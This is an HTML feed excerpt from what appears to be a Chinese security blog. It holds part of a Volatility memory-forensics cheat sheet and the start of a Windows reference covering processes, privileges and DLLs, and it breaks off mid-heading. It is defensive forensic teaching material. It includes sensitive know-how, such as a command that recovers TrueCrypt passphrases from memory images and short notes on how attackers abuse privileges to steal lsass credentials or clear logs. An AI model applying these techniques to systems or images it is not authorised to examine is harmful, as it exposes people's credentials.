&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; truecryptpassphrase 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;文件扫描与提取&#34;&gt;文件扫描与提取
&lt;/h2&gt;&lt;h3 id=&#34;扫描内存中的文件filescan&#34;&gt;扫描内存中的文件（filescan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-24&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; filescan 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果知道具体文件名称（&lt;code&gt;-i&lt;/code&gt;忽略大小写）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; filescan | grep -i &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;secret.txt&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果想找指定文件类型（&lt;code&gt;-E&lt;/code&gt;正则匹配）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; filescan | grep  -E &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;jpg|png|jpeg|bmp|gif&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250706184859261&#34; href=&#34;http://picture.928330.xyz/typora/image-20250706184859261.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706184859261.png&#34; alt=&#34;image-20250706184859261&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最前面的十六进制是文件地址&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-24&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.filescan.FileScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250717182605948&#34; href=&#34;http://picture.928330.xyz/typora/image-20250717182605948.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250717182605948.png&#34; alt=&#34;image-20250717182605948&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;从内存中转储指定文件dumpfiles&#34;&gt;从内存中转储指定文件（dumpfiles）
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;filescan&lt;/code&gt;插件扫描的是&lt;code&gt;_FILE_OBJECT&lt;/code&gt;这样的内核结构，相当于找到了文件的档案卡&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dumpfiles&lt;/code&gt;插件则是根据这张档案卡的指引，去内存中寻找文件的具体内容&lt;/p&gt;
&lt;p&gt;如果文件的内容当时没有被加载到内存（RAM）中，或者已经被操作系统置换到了页面文件（pagefile.sys）里，那么&lt;code&gt;dumpfiles&lt;/code&gt;就无法从内存镜像中提取出完整的文件数据&lt;/p&gt;
&lt;h4 id=&#34;volatility2-25&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;配置文件&amp;gt; dumpfiles -Q &amp;lt;物理地址&amp;gt; -D &amp;lt;目录&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;下载的文件是.data文件，改后缀或使用foremost等工具分析&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-25&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; -o &amp;lt;目录&amp;gt; windows.dumpfiles.DumpFiles --physaddr &amp;lt;物理地址&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;从内存中搜索字符串-strings&#34;&gt;从内存中搜索字符串 (strings)
&lt;/h3&gt;&lt;p&gt;Volatility3有&lt;code&gt;windows.strings.Strings&lt;/code&gt;插件，不过不太好用，我们主要目的还是搜索字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见的用法是先用&lt;code&gt;memdump&lt;/code&gt;转储出某个可疑进程的内存文件，然后对这个小文件执行&lt;code&gt;strings&lt;/code&gt;，这样目标更明确，噪音也更少：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strings 1234.dmp | grep -i &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;关键词&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>windows相关知识总结（下）</title>
        <link>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/</link>
        <pubDate>Mon, 21 Jul 2025 12:18:54 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/</guid>
        <description>&lt;img src="http://picture.928330.xyz/typora/628735" alt="Featured image of post windows相关知识总结（下）" /&gt;&lt;p&gt;&lt;strong&gt;windows相关知识总结（上）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;进程&#34;&gt;进程
&lt;/h1&gt;&lt;h2 id=&#34;常见进程&#34;&gt;常见进程
&lt;/h2&gt;&lt;h3 id=&#34;初始化进程&#34;&gt;初始化进程
&lt;/h3&gt;&lt;h4 id=&#34;system&#34;&gt;System
&lt;/h4&gt;&lt;p&gt;进程ID通常为4，是内核级线程的宿主，是运行&lt;code&gt;ntoskrnl.exe&lt;/code&gt;的容器&lt;/p&gt;
&lt;p&gt;（&lt;code&gt;ntoskrnl.exe&lt;/code&gt;负责内存管理、进程/线程调度、硬件抽象、系统调用处理等功能）&lt;/p&gt;
&lt;p&gt;它是进程树的根，没有父进程，如果看到有用户模式的进程成为它的子进程，需要高度警惕&lt;/p&gt;
&lt;h4 id=&#34;smssexe&#34;&gt;smss.exe
&lt;/h4&gt;&lt;p&gt;会话管理器子系统，负责创建新的用户会话，是系统中的第一个真实进程&lt;/p&gt;
&lt;p&gt;它会启动&lt;code&gt;csrss.exe&lt;/code&gt;和&lt;code&gt;winlogon.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;csrssexe&#34;&gt;csrss.exe
&lt;/h4&gt;&lt;p&gt;客户端/服务器运行时子系统，负责管理窗口、线程和控制台等，每个会话中都会有一个实例&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;smss.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;wininitexe&#34;&gt;wininit.exe
&lt;/h4&gt;&lt;p&gt;Windows初始化进程，在系统引导时启动，会一直保留在后台运行&lt;/p&gt;
&lt;p&gt;它的核心任务是启动三个关键进程：&lt;code&gt;services.exe&lt;/code&gt;、&lt;code&gt;lsass.exe&lt;/code&gt;和&lt;code&gt;lsm.exe&lt;/code&gt;，任何其他进程都值得审查&lt;/p&gt;
&lt;p&gt;其父进程应为空&lt;/p&gt;
&lt;h4 id=&#34;winlogonexe&#34;&gt;winlogon.exe
&lt;/h4&gt;&lt;p&gt;Windows 登录管理器，负责处理用户的交互式登录与注销过程，并加载用户配置文件&lt;/p&gt;
&lt;p&gt;在用户成功登录后，它会负责启动&lt;code&gt;userinit.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;smss.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;userinitexe&#34;&gt;userinit.exe
&lt;/h4&gt;&lt;p&gt;用户初始化进程，负责在用户登录后执行登录脚本、恢复网络连接，并启动用户外壳程序（Shell）&lt;/p&gt;
&lt;p&gt;它在启动了用户的桌面环境（默认为 &lt;code&gt;explorer.exe&lt;/code&gt;）后会立刻退出，&lt;strong&gt;因此在正常的进程列表中几乎看不到它&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;winlogon.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;explorerexe&#34;&gt;explorer.exe
&lt;/h4&gt;&lt;p&gt;Windows资源管理器，也是用户登录后启动的第一个进程，是所有用户图形化操作的起点&lt;/p&gt;
&lt;p&gt;在一个标准的 Windows 会话中，它有四个功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;文件管理器&lt;/strong&gt;：打开“我的电脑”时看到的那些文件和文件夹窗口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;任务栏与开始菜单&lt;/strong&gt;：屏幕底部的任务栏、开始按钮、系统托盘区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;桌面图标管理器&lt;/strong&gt;：桌面图标，以及对它们的点击、拖拽等交互&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;桌面背景绘制&lt;/strong&gt;：桌面壁纸等&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;恶意软件经常向其注入DLL，以获取用户权限并保持持久化&lt;/p&gt;
&lt;h3 id=&#34;核心服务进程&#34;&gt;核心服务进程
&lt;/h3&gt;&lt;h4 id=&#34;servicesexe&#34;&gt;services.exe
&lt;/h4&gt;&lt;p&gt;服务控制管理器，负责启动和管理所有系统服务，是所有通过正常方式启动的&lt;code&gt;svchost.exe&lt;/code&gt;的父进程&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;wininit.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;lsassexe&#34;&gt;lsass.exe
&lt;/h4&gt;&lt;p&gt;本地安全机构子系统服务，内存中存放着用户的密码哈希等敏感凭证，系统中必须有且只有一个实例&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;wininit.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;lsmexe&#34;&gt;lsm.exe
&lt;/h4&gt;&lt;p&gt;本地会话管理器服务，处理与用户登录、注销、远程桌面连接和快速用户切换相关的终端服务&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;wininit.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;svchostexe&#34;&gt;svchost.exe
&lt;/h4&gt;&lt;p&gt;服务宿主进程，是 Windows 系统中的一个核心进程，专门用作运行各种系统服务的“容器”或“宿主”&lt;/p&gt;
&lt;p&gt;它也是最常见的伪装和注入目标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;父进程&lt;/strong&gt;：必须是&lt;code&gt;services.exe&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;文件路径&lt;/strong&gt;：必须位于&lt;code&gt;C:\Windows\System32\&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络连接&lt;/strong&gt;：它承载的系统服务中，哪些建立了网络连接，连接到哪里&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;脚本执行进程&#34;&gt;脚本执行进程
&lt;/h3&gt;&lt;h4 id=&#34;rundll32exe&#34;&gt;rundll32.exe
&lt;/h4&gt;&lt;p&gt;用于执行DLL文件中的函数，攻击者常用它来加载恶意DLL，从而绕过基于程序名的检测&lt;/p&gt;
&lt;p&gt;分析时应关注其父进程是谁，以及它加载了哪个DLL&lt;/p&gt;
&lt;h4 id=&#34;powershellexe&#34;&gt;powershell.exe
&lt;/h4&gt;&lt;p&gt;是命令行和脚本引擎，现代无文件攻击的首选工具&lt;/p&gt;
&lt;p&gt;任何&lt;code&gt;powershell.exe&lt;/code&gt;的出现都值得审查，特别是其命令行参数中是否包含编码（&lt;code&gt;-e&lt;/code&gt;）、混淆或下载链接&lt;/p&gt;
&lt;h4 id=&#34;conhostexe&#34;&gt;conhost.exe
&lt;/h4&gt;&lt;p&gt;控制台窗口主机，为&lt;code&gt;cmd.exe&lt;/code&gt;等命令行程序提供交互界面&lt;/p&gt;
&lt;p&gt;它的内存中存储了该命令行窗口中所有输入过的命令和输出过的结果&lt;/p&gt;
&lt;h2 id=&#34;进程权限&#34;&gt;进程权限
&lt;/h2&gt;&lt;h3 id=&#34;系统级核心特权&#34;&gt;系统级核心特权
&lt;/h3&gt;&lt;h4 id=&#34;setcbprivilege&#34;&gt;SeTcbPrivilege
&lt;/h4&gt;&lt;p&gt;**这是Windows中权限最高、最强大的特权之一。**全称是作为操作系统的一部分(Act as part of the operating system)，通常被称为可信计算基（Trusted Computer Base, TCB）特权&lt;/p&gt;
&lt;p&gt;拥有此特权的进程被视为系统核心信任的一部分，可以执行几乎任何操作，包括创建安全令牌来冒充任何用户，除了极少数核心系统进程，任何程序都不应拥有它&lt;/p&gt;
&lt;h4 id=&#34;sedebugprivilege&#34;&gt;SeDebugPrivilege
&lt;/h4&gt;&lt;p&gt;**调试程序特权。**它授予一个进程附加到其他任意进程并检查、修改其内存的能力&lt;/p&gt;
&lt;p&gt;攻击者常利用它来从&lt;code&gt;lsass.exe&lt;/code&gt;中窃取密码，除了调试器和核心安全软件，任何普通程序（如记事本、浏览器）拥有它都极度可疑&lt;/p&gt;
&lt;h4 id=&#34;seloaddriverprivilege&#34;&gt;SeLoadDriverPrivilege
&lt;/h4&gt;&lt;p&gt;**加载和卸载设备驱动程序特权。**它授予一个进程将内核模式驱动程序（&lt;code&gt;.sys&lt;/code&gt;文件）加载到Windows内核中或从内核中卸载的能力&lt;/p&gt;
&lt;p&gt;这是通往内核模式的入口，恶意软件一旦获得此特权，就可以加载自己的恶意驱动，从而隐藏文件、进程、网络连接，并完全绕过用户态的安全软件&lt;/p&gt;
&lt;h3 id=&#34;安全与审计特权&#34;&gt;安全与审计特权
&lt;/h3&gt;&lt;h4 id=&#34;setakeownershipprivilege&#34;&gt;SeTakeOwnershipPrivilege
&lt;/h4&gt;&lt;p&gt;**获取对象所有权特权。**它授予进程获取系统上任何安全对象（如文件、文件夹、注册表项）的所有权的能力，即使该进程原本没有访问该对象的权限&lt;/p&gt;
&lt;p&gt;攻击者获得它之后，就可以强行霸占受系统保护的文件或注册表键，然后赋予自己读写权限，进而篡改系统配置或替换核心文件&lt;/p&gt;
&lt;h4 id=&#34;sebackupprivilege&#34;&gt;SeBackupPrivilege
&lt;/h4&gt;&lt;p&gt;**备份文件和目录特权，可以做到读取一切。**它允许进程在读取文件时，绕过所有常规的文件和目录权限检查（ACL），其初衷是让备份软件可以备份系统上的所有文件&lt;/p&gt;
&lt;p&gt;数据窃取类木马和勒索软件经常利用此特权来读取它们本无权访问的敏感用户文档、数据库文件或配置文件，以便进行窃取或加密&lt;/p&gt;
&lt;h4 id=&#34;serestoreprivilege&#34;&gt;SeRestorePrivilege
&lt;/h4&gt;&lt;p&gt;**还原文件和目录特权，可以做到写入一切。**与&lt;code&gt;SeBackupPrivilege&lt;/code&gt;对应，它允许进程在写入文件时，绕过所有权限检查&lt;/p&gt;
&lt;p&gt;恶意软件可以利用它来覆盖受保护的系统文件、在系统目录中释放恶意程序，或修改锁定的配置文件以实现持久化&lt;/p&gt;
&lt;h4 id=&#34;sesecurityprivilege&#34;&gt;SeSecurityPrivilege
&lt;/h4&gt;&lt;p&gt;**管理审核和安全日志特权，可以做到删除痕迹。**主要允许进程查看和清空 Windows 安全事件日志&lt;/p&gt;
&lt;p&gt;攻击者在完成入侵后，会利用这个特权来清空安全日志，从而抹去自己的登录尝试、账户创建、权限使用等痕迹&lt;/p&gt;
&lt;h3 id=&#34;常规特权&#34;&gt;常规特权
&lt;/h3&gt;&lt;h4 id=&#34;seshutdownprivilege&#34;&gt;SeShutdownPrivilege
&lt;/h4&gt;&lt;p&gt;**关闭系统特权。**授予进程关闭本地计算机的权力&lt;/p&gt;
&lt;h4 id=&#34;seimpersonateprivilege&#34;&gt;SeImpersonatePrivilege
&lt;/h4&gt;&lt;p&gt;**身份验证后模拟客户端特权。**通常授予服务类账户，允许一个服务进程模拟连接到它的客户端的安全上下文&lt;/p&gt;
&lt;p&gt;攻击者可以诱使一个高权限进程（如SYSTEM）来连接自己，然后利用此特权“模拟”这个高权限进程，从而将自己从一个低权限的服务账户提升到&lt;code&gt;SYSTEM&lt;/code&gt;权限&lt;/p&gt;
&lt;h4 id=&#34;sechangenotifyprivilege&#34;&gt;SeChangeNotifyPrivilege
&lt;/h4&gt;&lt;p&gt;**绕过遍历检查特权。**它允许进程在访问一个对象时，无需检查路径中所有上级目录的权限&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是一个正常无害的特权，Windows 默认会将其授予所有用户，包括最低权限的用户&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;dll&#34;&gt;DLL
&lt;/h1&gt;&lt;h2 id=&#34;什么是dll&#34;&gt;什么是DLL
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”&lt;/strong&gt;，是软件文件类型&lt;/p&gt;
&lt;p&gt;在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中，当我们执行某一个程序时，相应的DLL文件就会被调用&lt;/p&gt;
&lt;p&gt;一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件&lt;/p&gt;
&lt;p&gt;DLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用&lt;/p&gt;
&lt;p&gt;使用DLL文件的好处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从DLL中取出&lt;/p&gt;
&lt;h2 id=&#34;dll的调用方式&#34;&gt;DLL的调用方式
&lt;/h2&gt;&lt;h3 id=&#34;1-静态调用--隐式链接&#34;&gt;1. 静态调用 / 隐式链接
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在运行程序前，必须先把所有的DLL都准备好，少一个都不行&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在编译程序的时候，开发者就已经在代码中明确声明了需要用到哪些DLL里的哪些函数&lt;/li&gt;
&lt;li&gt;这些依赖关系被记录在最终生成的可执行文件（&lt;code&gt;.exe&lt;/code&gt;）的头部，一个叫做“导入表“（Import Table）的地方&lt;/li&gt;
&lt;li&gt;当运行这个.exe文件时，Windows加载器会首先读取这个表&lt;/li&gt;
&lt;li&gt;加载器会根据导入表的信息，在硬盘上找到所有必需的DLL文件，并将它们加载到该进程的内存空间中&lt;/li&gt;
&lt;li&gt;所有函数地址都链接好之后，程序的主代码才开始执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-动态调用--显式链接&#34;&gt;2. 动态调用 / 显式链接
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在运行程序前，不需要把所有的DLL都准备好，少了哪个就引入哪个&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;程序在编译时，并不知道自己会用到哪些DLL&lt;/li&gt;
&lt;li&gt;程序在运行过程中，根据当时的逻辑判断，临时决定需要某个DLL的功能&lt;/li&gt;
&lt;li&gt;程序会调用特定的WindowsAPI函数来手动加载这个DLL
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;LoadLibrary()&lt;/code&gt;：这个函数用来将指定的DLL文件加载到内存中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GetProcAddress()&lt;/code&gt;：加载成功后，用这个函数从DLL中获取特定函数的地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;拿到函数地址后，程序就可以像调用自己的函数一样调用它了&lt;/li&gt;
&lt;li&gt;当不再需要时，可以调用&lt;code&gt;FreeLibrary()&lt;/code&gt;将其从内存中卸载&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;常见dll&#34;&gt;常见DLL
&lt;/h2&gt;&lt;h3 id=&#34;核心系统库-几乎所有进程都会加载&#34;&gt;核心系统库 (几乎所有进程都会加载)
&lt;/h3&gt;&lt;h4 id=&#34;ntdlldll&#34;&gt;ntdll.dll
&lt;/h4&gt;&lt;p&gt;WindowsNT核心库，是用户态程序与系统内核之间最底层的接口，封装了大量的系统调用，例如进程和线程的创建、内存管理、文件I/O以及与内核对象的交互&lt;/p&gt;
&lt;p&gt;其他更高层的核心库（如&lt;code&gt;kernel32.dll&lt;/code&gt;）最终也需要调用&lt;code&gt;ntdll.dll&lt;/code&gt;中的函数来完成实际的工作&lt;/p&gt;
&lt;h4 id=&#34;kernel32dll--kernelbasedll&#34;&gt;kernel32.dll / kernelbase.dll
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;kernel32.dll&lt;/code&gt;是Windows中最核心的用户模式库之一，为应用程序提供了访问操作系统的基础功能，如内存管理、文件I/O和进程线程管理&lt;/p&gt;
&lt;p&gt;从Windows7开始，许多&lt;code&gt;kernel32.dll&lt;/code&gt;的核心功能被重构并移入了&lt;code&gt;kernelbase.dll&lt;/code&gt;，而&lt;code&gt;kernel32.dll&lt;/code&gt;本身则更多地作为调用这些新功能的一个“转发层”&lt;/p&gt;
&lt;h4 id=&#34;user32dll&#34;&gt;user32.dll
&lt;/h4&gt;&lt;p&gt;负责所有用户图形界面（GUI）的功能设计，如窗口、菜单、按钮、鼠标和键盘输入等，即&lt;strong&gt;结构和交互&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在早期32-bit 版本的Windows中，用户控件是在&lt;code&gt;ComCtl32&lt;/code&gt;中实现的，但是一些控件的显示功能是在&lt;code&gt;User32.dll&lt;/code&gt;中实现的，例如在一个窗口中非客户区域（边框和菜单）的绘制就是由&lt;code&gt;User32.dll&lt;/code&gt;来完成的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;User32.dll&lt;/code&gt;是操作系统的一个核心控件，它和操作系统是紧密联系在一起的，不同版本的Windows中&lt;code&gt;User32.dll&lt;/code&gt;是不同，因此，应用程序在不同版本的Windows中运行的时候，由于&lt;code&gt;User32.dll&lt;/code&gt;的不同，会导致应用程序的界面通常会有微小的不同&lt;/p&gt;
&lt;h4 id=&#34;gdi32dll&#34;&gt;gdi32.dll
&lt;/h4&gt;&lt;p&gt;负责图形化窗口的图形绘制与内容输出，包括像素、线条、字体、位图、画刷等，即&lt;strong&gt;内容和外观&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;comdlg32dll&#34;&gt;comdlg32.dll
&lt;/h4&gt;&lt;p&gt;通用对话框库（Common Dialog Box Library），这个库为应用程序提供了标准的、预制好的对话框，比如常见的“打开文件”、“保存文件”和“打印”等窗口&lt;/p&gt;
&lt;p&gt;当&lt;code&gt;user32.dll&lt;/code&gt;需要一个“打开文件”对话框时，它不去自己一点点造，而是直接从&lt;code&gt;comdlg32.dll&lt;/code&gt;这里拿一个现成的、标准化的来用&lt;/p&gt;
&lt;h4 id=&#34;advapi32dll&#34;&gt;advapi32.dll
&lt;/h4&gt;&lt;p&gt;高级Windows32位应用程序接口，负责处理注册表操作、系统服务管理、账户和安全相关的函数&lt;/p&gt;
&lt;h3 id=&#34;网络通信库-判断网络行为的关键&#34;&gt;网络通信库 (判断网络行为的关键)
&lt;/h3&gt;&lt;h4 id=&#34;ws2_32dll--wsock32dll&#34;&gt;ws2_32.dll / wsock32.dll
&lt;/h4&gt;&lt;p&gt;Windows Sockets（套接字）库，是所有 TCP/IP 网络编程的基础&lt;/p&gt;
&lt;p&gt;这是一个最重要的网络行为指标&lt;/p&gt;
&lt;h4 id=&#34;wininetdll&#34;&gt;wininet.dll
&lt;/h4&gt;&lt;p&gt;更高层的互联网协议库，封装了 HTTP、HTTPS 和 FTP 等协议，让程序能更方便地访问网页和传输文件。&lt;/p&gt;
&lt;h4 id=&#34;dnsapidll&#34;&gt;dnsapi.dll
&lt;/h4&gt;&lt;p&gt;负责进行 DNS 域名解析，即将网址（如 &lt;code&gt;www.google.com&lt;/code&gt;）转换为 IP 地址&lt;/p&gt;
&lt;h3 id=&#34;脚本与执行相关库&#34;&gt;脚本与执行相关库
&lt;/h3&gt;&lt;h4 id=&#34;shell32dll&#34;&gt;shell32.dll
&lt;/h4&gt;&lt;p&gt;提供了核心的 Windows Shell（外壳）功能，如打开文件、显示属性、处理快捷方式等&lt;/p&gt;
&lt;h4 id=&#34;ole32dll--oleaut32dll&#34;&gt;ole32.dll / oleaut32.dll
&lt;/h4&gt;&lt;p&gt;负责处理 OLE（对象链接与嵌入）和 COM（组件对象模型）技术&lt;/p&gt;
&lt;p&gt;Office 宏病毒和许多漏洞利用（如利用文档中嵌入的恶意对象）都严重依赖这两个库的功能&lt;/p&gt;
&lt;h4 id=&#34;jscriptdll--vbscriptdll&#34;&gt;jscript.dll / vbscript.dll
